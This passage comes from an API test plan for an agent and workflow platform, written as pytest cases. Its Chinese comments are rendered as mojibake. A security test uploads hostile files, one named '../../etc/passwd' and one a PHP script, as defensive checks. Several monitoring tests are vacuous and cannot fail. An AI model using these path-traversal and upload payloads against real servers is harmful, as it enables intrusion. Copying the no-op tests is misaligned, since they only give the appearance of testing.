    response = client.delete(f"/api/v1/Agent/{agent_id}")
    assert response.status_code in [200, 404, 401]
```

**P1-API-002: èµ„æºå‘½åè§„èŒƒæµ‹è¯•**
```python
def test_resource_naming_conventions():
    # éªŒè¯APIè·¯å¾„ä½¿ç”¨å¤æ•°åè¯
    endpoints = [
        "/api/v1/Agent/",
        "/api/v1/Workflow/",
        "/api/v1/Tool/",
        "/api/v1/Execution/",
        "/api/v1/Billing/"
    ]
    
    for endpoint in endpoints:
        response = client.get(endpoint)
        assert response.status_code in [200, 401]
```

#### âœ“ å“åº”æ ¼å¼æµ‹è¯•

**P1-API-003: ç»Ÿä¸€å“åº”æ ¼å¼æµ‹è¯•**
```python
def test_response_format_consistency():
    # æµ‹è¯•æˆåŠŸå“åº”æ ¼å¼
    response = client.post("/api/v1/Auth/login", json={
        "username": "valid_user",
        "password": "valid_pass"
    })
    
    if response.status_code == 200:
        data = response.json()
        assert "code" in data
        assert "message" in data
        assert "data" in data
        assert data["code"] == 200
    
    # æµ‹è¯•é”™è¯¯å“åº”æ ¼å¼
    response = client.post("/api/v1/Auth/login", json={
        "username": "invalid",
        "password": "invalid"
    })
    
    if response.status_code == 401:
        data = response.json()
        assert "detail" in data
```

**P1-API-004: åˆ†é¡µå“åº”æ ¼å¼æµ‹è¯•**
```python
def test_pagination_response_format():
    response = client.get("/api/v1/Agent/?skip=0&limit=10")
    
    if response.status_code == 200:
        data = response.json()
        assert "data" in data
        assert "total" in data
        assert isinstance(data["data"], list)
        assert isinstance(data["total"], int)
```

#### âœ“ å‚æ•°æ ¡éªŒæµ‹è¯•

**P1-API-005: åˆ†é¡µå‚æ•°æ ¡éªŒæµ‹è¯•**
```python
def test_pagination_parameters():
    # æµ‹è¯•è´Ÿæ•°skip
    response = client.get("/api/v1/Agent/?skip=-1")
    assert response.status_code in [400, 422]
    
    # æµ‹è¯•è¿‡å¤§çš„limit
    response = client.get("/api/v1/Agent/?limit=1000")
    assert response.status_code in [400, 422]
    
    # æµ‹è¯•éæ•°å­—å‚æ•°
    response = client.get("/api/v1/Agent/?skip=abc")
    assert response.status_code in [400, 422]
```

**P1-API-006: æ—¥æœŸå‚æ•°æ ¡éªŒæµ‹è¯•**
```python
def test_date_parameter_validation():
    # æµ‹è¯•æ— æ•ˆæ—¥æœŸæ ¼å¼
    invalid_dates = [
        "2023-13-01",  # æ— æ•ˆæœˆä»½
        "2023-02-30",  # æ— æ•ˆæ—¥æœŸ
        "invalid-date",
        "2023/01/01"  # é”™è¯¯æ ¼å¼
    ]
    
    for date in invalid_dates:
        response = client.get(f"/api/v1/Billing/usage?start_date={date}")
        assert response.status_code in [400, 422]
```

#### âœ“ æ¥å£æ–‡æ¡£æµ‹è¯•

**P1-API-007: APIæ–‡æ¡£å®Œæ•´æ€§æµ‹è¯•**
```python
def test_api_documentation():
    # æµ‹è¯•Swaggeræ–‡æ¡£å¯è®¿é—®æ€§
    response = client.get("/docs")
    assert response.status_code == 200
    
    # æµ‹è¯•ReDocæ–‡æ¡£å¯è®¿é—®æ€§
    response = client.get("/redoc")
    assert response.status_code == 200
```

### 4. ä»£ç è´¨é‡æµ‹è¯•

#### âœ“ é”™è¯¯å¤„ç†æµ‹è¯•

**P1-CODE-001: å¼‚å¸¸å¤„ç†å®Œæ•´æ€§æµ‹è¯•**
```python
def test_exception_handling():
    # æµ‹è¯•æ•°æ®åº“è¿æ¥å¼‚å¸¸
    with patch('app.db.session.get_db') as mock_db:
        mock_db.side_effect = Exception("Connection failed")
        
        response = client.get("/api/v1/Agent/")
        assert response.status_code == 500
        
        # é”™è¯¯å“åº”åº”è¯¥åŒ…å«é”™è¯¯ä¿¡æ¯
        assert "detail" in response.json()

# æµ‹è¯•åœºæ™¯ï¼šèµ„æºä¸å­˜åœ¨
def test_resource_not_found():
    response = client.get("/api/v1/Agent/99999")
    assert response.status_code == 404
    assert "ä¸å­˜åœ¨" in response.json()["detail"]
```

**P1-CODE-002: å‚æ•°éªŒè¯é”™è¯¯å¤„ç†æµ‹è¯•**
```python
def test_parameter_validation_errors():
    # æµ‹è¯•å„ç§æ— æ•ˆå‚æ•°
    invalid_params = [
        {"name": None},
        {"name": ""},
        {"description": "x" * 10000},  # è¿‡é•¿æè¿°
        {"invalid_field": "value"}  # ä¸å­˜åœ¨çš„å­—æ®µ
    ]
    
    for params in invalid_params:
        response = client.post("/api/v1/Agent/", json=params,
                              headers={"Authorization": f"Bearer {valid_token}"})
        assert response.status_code in [400, 422]
```

#### âœ“ æ—¥å¿—è®°å½•æµ‹è¯•

**P1-CODE-003: æ—¥å¿—è®°å½•å®Œæ•´æ€§æµ‹è¯•**
```python
def test_logging_completeness():
    with patch('app.core.logger.setup_logger') as mock_logger:
        mock_instance = Mock()
        mock_logger.return_value = mock_instance
        
        # æ‰§è¡Œæ“ä½œ
        client.post("/api/v1/Auth/login", json={
            "username": "test",
            "password": "test"
        })
        
        # éªŒè¯æ—¥å¿—è¢«è°ƒç”¨
        assert mock_instance.info.called or mock_instance.error.called
```

**P1-CODE-004: é”™è¯¯æ—¥å¿—è®°å½•æµ‹è¯•**
```python
def test_error_logging():
    with patch('app.core.logger.setup_logger') as mock_logger:
        mock_instance = Mock()
        mock_logger.return_value = mock_instance
        
        # è§¦å‘é”™è¯¯
        response = client.get("/api/v1/Agent/99999")
        
        # éªŒè¯é”™è¯¯æ—¥å¿—è¢«è®°å½•
        assert mock_instance.error.called
```

#### âœ“ èŒè´£å•ä¸€æµ‹è¯•

**P1-CODE-005: æ§åˆ¶å™¨èŒè´£æµ‹è¯•**
```python
def test_controller_single_responsibility():
    # éªŒè¯æ§åˆ¶å™¨åªè´Ÿè´£HTTPè¯·æ±‚å¤„ç†ï¼Œä¸åŒ…å«ä¸šåŠ¡é€»è¾‘
    # è¿™ä¸ªæµ‹è¯•éœ€è¦æ£€æŸ¥ä»£ç ç»“æ„ï¼Œå¯ä»¥é€šè¿‡é™æ€åˆ†ææˆ–ä»£ç å®¡æŸ¥
    
    # æ£€æŸ¥APIç«¯ç‚¹æ–‡ä»¶æ˜¯å¦åŒ…å«ç›´æ¥çš„ä¸šåŠ¡é€»è¾‘
    auth_file = "app/api/v1/endpoints/auth.py"
    with open(auth_file, 'r') as f:
        content = f.read()
        
    # åº”è¯¥è°ƒç”¨serviceå±‚è€Œä¸æ˜¯ç›´æ¥å¤„ç†ä¸šåŠ¡é€»è¾‘
    assert "AuthService" in content
    # ä¸åº”è¯¥åŒ…å«å¤æ‚çš„ä¸šåŠ¡é€»è¾‘
    assert content.count("if") < 20  # ç®€å•çš„æ£€æŸ¥
```

### 5. ç›‘æ§æ—¥å¿—æ£€æŸ¥æµ‹è¯•

#### âœ“ é”™è¯¯ç›‘æ§æµ‹è¯•

**P1-MONITOR-001: é”™è¯¯ç›‘æ§é›†æˆæµ‹è¯•**
```python
def test_error_monitoring_integration():
    # æ¨¡æ‹Ÿé”™è¯¯ç›‘æ§æœåŠ¡
    with patch('app.services.monitoring_service.log_error') as mock_log:
        # è§¦å‘é”™è¯¯
        response = client.get("/api/v1/Agent/99999")
        
        # éªŒè¯é”™è¯¯è¢«è®°å½•åˆ°ç›‘æ§ç³»ç»Ÿ
        if mock_log.called:
            assert True  # é”™è¯¯ç›‘æ§æ­£å¸¸å·¥ä½œ
```

#### âœ“ æ€§èƒ½ç›‘æ§æµ‹è¯•

**P1-MONITOR-002: æ€§èƒ½ç›‘æ§æµ‹è¯•**
```python
def test_performance_monitoring():
    with patch('app.services.monitoring_service.record_performance') as mock_perf:
        # æ‰§è¡Œæ“ä½œ
        response = client.get("/api/v1/Agent/")
        
        # éªŒè¯æ€§èƒ½æŒ‡æ ‡è¢«è®°å½•
        if mock_perf.called:
            assert True  # æ€§èƒ½ç›‘æ§æ­£å¸¸å·¥ä½œ
```

#### âœ“ ç”¨æˆ·è¡Œä¸ºåŸ‹ç‚¹æµ‹è¯•

**P1-MONITOR-003: ç”¨æˆ·è¡Œä¸º_trackingæµ‹è¯•**
```python
def test_user_behavior_tracking():
    with patch('app.services.monitoring_service.track_user_action') as mock_track:
        # æ‰§è¡Œç”¨æˆ·æ“ä½œ
        client.post("/api/v1/Agent/", json={
            "name": "test",
            "description": "test"
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        # éªŒè¯ç”¨æˆ·è¡Œä¸ºè¢«è·Ÿè¸ª
        if mock_track.called:
            assert True  # ç”¨æˆ·è¡Œä¸ºè·Ÿè¸ªæ­£å¸¸å·¥ä½œ
```

---

## è¾¹ç•Œæ¡ä»¶æµ‹è¯•

### 1. æé™å€¼æµ‹è¯•

**BOUNDARY-001: å¤§æ•°æ®é‡æµ‹è¯•**
```python
def test_large_data_handling():
    # æµ‹è¯•å¤§é‡ç”¨æˆ·åˆ—è¡¨
    for i in range(100):
        client.post("/api/v1/Auth/register", json={
            "username": f"bulk_user_{i}",
            "password": "test123",
            "email": f"bulk_{i}@test.com"
        })
    
    # æµ‹è¯•åˆ†é¡µæ€§èƒ½
    response = client.get("/api/v1/Auth/users?skip=0&limit=100")
    assert response.status_code == 200
    assert len(response.json()["data"]) <= 100
```

**BOUNDARY-002: å­—ç¬¦è¾¹ç•Œæµ‹è¯•**
```python
def test_string_boundaries():
    # æµ‹è¯•ç©ºå­—ç¬¦ä¸²
    response = client.post("/api/v1/Auth/register", json={
        "username": "",
        "password": "test123",
        "email": "test@example.com"
    })
    assert response.status_code in [400, 422]
    
    # æµ‹è¯•æœ€å¤§é•¿åº¦å­—ç¬¦ä¸²
    max_username = "a" * 50
    response = client.post("/api/v1/Auth/register", json={
        "username": max_username,
        "password": "test123",
        "email": "test@example.com"
    })
    assert response.status_code in [200, 400]  # å–å†³äºæ˜¯å¦å·²å­˜åœ¨
```

**BOUNDARY-003: æ•°å€¼è¾¹ç•Œæµ‹è¯•**
```python
def test_numeric_boundaries():
    # æµ‹è¯•é›¶å€¼
    response = client.post("/api/v1/Billing/quotas", json={
        "user_id": 1,
        "agent_id": 1,
        "monthly_limit": 0
    }, headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code in [200, 400, 422]
    
    # æµ‹è¯•æå¤§å€¼
    response = client.post("/api/v1/Billing/quotas", json={
        "user_id": 1,
        "agent_id": 1,
        "monthly_limit": 999999999.99
    }, headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code in [200, 400, 422]
    
    # æµ‹è¯•è´Ÿæ•°
    response = client.post("/api/v1/Billing/quotas", json={
        "user_id": 1,
        "agent_id": 1,
        "monthly_limit": -100
    }, headers={"Authorization": f"Bearer {valid_token}"})
    assert response.status_code in [400, 422]
```

### 2. ç½‘ç»œå¼‚å¸¸æµ‹è¯•

**NETWORK-001: è¶…æ—¶å¤„ç†æµ‹è¯•**
```python
def test_timeout_handling():
    with patch('app.db.session.AsyncSession.execute') as mock_execute:
        mock_execute.side_effect = asyncio.TimeoutError("Database timeout")
        
        response = client.get("/api/v1/Agent/")
        assert response.status_code == 500
```

**NETWORK-002: è¿æ¥ä¸­æ–­æµ‹è¯•**
```python
def test_connection_interruption():
    with patch('app.db.session.AsyncSession.execute') as mock_execute:
        mock_execute.side_effect = ConnectionError("Connection lost")
        
        response = client.get("/api/v1/Agent/")
        assert response.status_code == 500
```

**NETWORK-003: é™æµæµ‹è¯•**
```python
def test_rate_limiting():
    # å¿«é€Ÿå‘é€å¤šä¸ªè¯·æ±‚
    responses = []
    for i in range(100):
        response = client.get("/api/v1/Agent/")
        responses.append(response.status_code)
    
    # åº”è¯¥æœ‰ä¸€äº›è¯·æ±‚è¢«é™æµ
    assert any(status == 429 for status in responses)
```

### 3. æƒé™è¾¹ç•Œæµ‹è¯•

**PERMISSION-001: è¶Šæƒè®¿é—®æµ‹è¯•**
```python
def test_unauthorized_access():
    # æœªè®¤è¯ç”¨æˆ·è®¿é—®éœ€è¦è®¤è¯çš„æ¥å£
    protected_endpoints = [
        "/api/v1/Agent/",
        "/api/v1/Workflow/",
        "/api/v1/Tool/",
        "/api/v1/Execution/",
        "/api/v1/Billing/"
    ]
    
    for endpoint in protected_endpoints:
        response = client.post(endpoint, json={"name": "test"})
        assert response.status_code in [401, 403]
```

**PERMISSION-002: è·¨ç”¨æˆ·æ•°æ®è®¿é—®æµ‹è¯•**
```python
def test_cross_user_data_access():
    # ç”¨æˆ·Aå°è¯•è®¿é—®ç”¨æˆ·Bçš„æ•°æ®
    user_a_token = create_user_token("user_a")
    user_b_id = get_user_id("user_b")
    
    response = client.get(f"/api/v1/Billing/quotas?user_id={user_b_id}",
                         headers={"Authorization": f"Bearer {user_a_token}"})
    assert response.status_code in [401, 403, 404]
```

---

## ç¯å¢ƒå…¼å®¹æ€§æµ‹è¯•

### 1. æ•°æ®åº“å…¼å®¹æ€§

**COMPAT-001: æ•°æ®åº“ç‰ˆæœ¬å…¼å®¹æ€§**
```python
def test_database_compatibility():
    # æµ‹è¯•ä¸åŒæ•°æ®åº“ç‰ˆæœ¬çš„SQLè¯­æ³•
    test_queries = [
        "SELECT * FROM users",
        "SELECT COUNT(*) FROM agents",
        "SELECT * FROM workflows WHERE is_published = true"
    ]
    
    for query in test_queries:
        # éªŒè¯SQLè¯­æ³•å…¼å®¹æ€§
        try:
            result = db.execute(text(query))
            assert result is not None
        except Exception as e:
            pytest.fail(f"SQLä¸å…¼å®¹: {query}, é”™è¯¯: {e}")
```

**COMPAT-002: æ•°æ®åº“è¿ç§»æµ‹è¯•**
```python
def test_database_migration():
    # æµ‹è¯•æ•°æ®åº“è¿ç§»è„šæœ¬
    from alembic import command
    from alembic.config import Config
    
    alembic_cfg = Config("alembic.ini")
    
    # å‡çº§åˆ°æœ€æ–°ç‰ˆæœ¬
    command.upgrade(alembic_cfg, "head")
    
    # éªŒè¯è¡¨ç»“æ„
    inspector = inspect(db)
    tables = inspector.get_table_names()
    assert "users" in tables
    assert "agents" in tables
    assert "workflows" in tables
```

### 2. æµè§ˆå™¨å…¼å®¹æ€§æµ‹è¯•

**COMPAT-003: APIè·¨åŸŸæµ‹è¯•**
```python
def test_cors_headers():
    response = client.options("/api/v1/Agent/")
    assert "Access-Control-Allow-Origin" in response.headers
    assert "Access-Control-Allow-Methods" in response.headers
    assert "Access-Control-Allow-Headers" in response.headers
```

### 3. å›½é™…åŒ–å…¼å®¹æ€§

**COMPAT-004: å¤šè¯­è¨€æ”¯æŒæµ‹è¯•**
```python
def test_i18n_support():
    # æµ‹è¯•ä¸­æ–‡è¾“å…¥
    response = client.post("/api/v1/Agent/", json={
        "name": "æµ‹è¯•ä»£ç†",
        "description": "è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•æè¿°"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    assert response.status_code in [200, 400, 422]
    
    # æµ‹è¯•emojiæ”¯æŒ
    response = client.post("/api/v1/Agent/", json={
        "name": "Test Agent ğŸš€",
        "description": "Test with emoji ğŸ˜Š"
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    assert response.status_code in [200, 400, 422]
```

### 4. æ—¶åŒºå…¼å®¹æ€§

**COMPAT-005: æ—¶åŒºå¤„ç†æµ‹è¯•**
```python
def test_timezone_handling():
    from datetime import datetime, timezone
    import pytz
    
    # æµ‹è¯•ä¸åŒæ—¶åŒºçš„æ—¶é—´æˆ³
    utc_time = datetime.now(timezone.utc)
    beijing_time = datetime.now(pytz.timezone('Asia/Shanghai'))
    
    response = client.post("/api/v1/Execution/", json={
        "workflow_id": 1,
        "agent_id": 1,
        "created_at": utc_time.isoformat()
    }, headers={"Authorization": f"Bearer {valid_token}"})
    
    assert response.status_code in [200, 400, 422]
```

---

## ç‰¹æ®Šåœºæ™¯æµ‹è¯•

### 1. é«˜å¹¶å‘åœºæ™¯

**CONCURRENCY-001: é«˜å¹¶å‘åˆ›å»ºæµ‹è¯•**
```python
def test_high_concurrency_creation():
    import asyncio
    import concurrent.futures
    
    async def create_agent_async(name):
        response = client.post("/api/v1/Agent/", json={
            "name": name,
            "description": "test"
        }, headers={"Authorization": f"Bearer {valid_token}"})
        return response.status_code
    
    # åˆ›å»º100ä¸ªå¹¶å‘è¯·æ±‚
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    tasks = []
    for i in range(100):
        task = create_agent_async(f"concurrent_agent_{i}")
        tasks.append(task)
    
    results = loop.run_until_complete(asyncio.gather(*tasks))
    loop.close()
    
    # éªŒè¯æ²¡æœ‰ç³»ç»Ÿå´©æºƒ
    assert all(status in [200, 400, 422, 500] for status in results)
    # 500é”™è¯¯åº”è¯¥å¾ˆå°‘
    error_count = sum(1 for status in results if status == 500)
    assert error_count < 5  # å…è®¸å°‘é‡ç³»ç»Ÿé”™è¯¯
```

### 2. æ•°æ®æ¢å¤åœºæ™¯

**RECOVERY-001: æ•°æ®åº“æ¢å¤æµ‹è¯•**
```python
def test_database_recovery():
    # æ¨¡æ‹Ÿæ•°æ®åº“ä¸­æ–­åæ¢å¤
    with patch('app.db.session.get_db') as mock_db:
        # ç¬¬ä¸€æ¬¡è°ƒç”¨å¤±è´¥
        mock_db.side_effect = [Exception("DB down"), Mock()]
        
        # ç¬¬ä¸€æ¬¡è¯·æ±‚å¤±è´¥
        response1 = client.get("/api/v1/Agent/")
        assert response1.status_code == 500
        
        # ç¬¬äºŒæ¬¡è¯·æ±‚æˆåŠŸï¼ˆæ•°æ®åº“æ¢å¤ï¼‰
        response2 = client.get("/api/v1/Agent/")
        assert response2.status_code in [200, 401]
```

### 3. å†…å­˜å‹åŠ›æµ‹è¯•

**MEMORY-001: å†…å­˜æ³„æ¼æµ‹è¯•**
```python
def test_memory_leak():
    import psutil
    import gc
    
    process = psutil.Process()
    initial_memory = process.memory_info().rss
    
    # æ‰§è¡Œå¤§é‡æ“ä½œ
    for i in range(1000):
        response = client.get("/api/v1/Agent/")
        assert response.status_code in [200, 401]
        
        # æ¯100æ¬¡æ“ä½œå¼ºåˆ¶åƒåœ¾å›æ”¶
        if i % 100 == 0:
            gc.collect()
    
    final_memory = process.memory_info().rss
    memory_increase = final_memory - initial_memory
    
    # å†…å­˜å¢é•¿åº”è¯¥åœ¨åˆç†èŒƒå›´å†…ï¼ˆå°äº100MBï¼‰
    assert memory_increase < 100 * 1024 * 1024
```

---

## å®‰å…¨å¢å¼ºæµ‹è¯•

### 1. è¾“å…¥éªŒè¯å¢å¼º

**SECURITY-001: æ¶æ„æ–‡ä»¶ä¸Šä¼ æµ‹è¯•**
```python
def test_malicious_file_upload():
    # å¦‚æœç³»ç»Ÿæ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œæµ‹è¯•æ¶æ„æ–‡ä»¶
    malicious_files = [
        ("malicious.exe", b"fake executable content"),
        ("script.php", b"<?php echo 'hack'; ?>"),
        ("../../etc/passwd", b"password file content")
    ]
    
    for filename, content in malicious_files:
        # æ ¹æ®å®é™…çš„æ–‡ä»¶ä¸Šä¼ æ¥å£è°ƒæ•´
        response = client.post("/api/v1/upload", files={
            "file": (filename, content)
        }, headers={"Authorization": f"Bearer {valid_token}"})
        
        assert response.status_code in [400, 422, 404]  # åº”è¯¥è¢«æ‹’ç»
```

### 2. ä¼šè¯å®‰å…¨æµ‹è¯•

**SECURITY-002: ä¼šè¯åŠ«æŒé˜²æŠ¤æµ‹è¯•**
```python
def test_session_hijacking_protection():
    # æµ‹è¯•ä¼šè¯å›ºå®šæ”»å‡»é˜²æŠ¤
    user_token = create_user_token("test_user")
    
    # æ¨¡æ‹Ÿä¼šè¯åŠ«æŒ
    stolen_response = client.get("/api/v1/Auth/user/info",
                               headers={"current_user_id": "1"})
    
    # åº”è¯¥éœ€è¦é‡æ–°è®¤è¯
    assert stolen_response.status_code in [401, 403]
```

---
